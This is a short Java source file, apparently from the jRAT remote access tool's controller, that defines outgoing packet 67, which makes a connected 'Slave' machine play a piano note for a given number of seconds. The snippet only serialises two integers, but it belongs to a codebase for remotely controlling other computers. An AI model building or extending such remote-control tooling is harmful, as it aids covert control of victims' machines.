package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet67LongPianoNote implements OutgoingPacket {

	private int note;
	private int seconds;

	public Packet67LongPianoNote(int note, int seconds) {
		this.note = note;
		this.seconds = seconds;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeInt(note);
		slave.writeInt(seconds);
	}

	@Override
	public short getPacketId() {
		return 67;
	}

}
